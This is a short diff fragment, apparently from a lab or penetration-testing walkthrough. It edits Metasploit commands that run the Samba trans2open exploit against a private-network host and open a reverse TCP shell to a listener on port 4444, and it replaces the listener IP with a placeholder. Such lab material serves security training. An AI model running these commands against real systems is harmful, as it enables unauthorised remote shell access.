@@ -835,7 +835,7 @@ use exploit/linux/samba/trans2open
 set RHOSTS 192.168.100.7
 set RPORT 139
 set PAYLOAD linux/x86/shell_reverse_tcp
-set LHOST 192.168.100.3
+set LHOST 192.168.100.x
 set LPORT 4444
 
 # Execute exploit
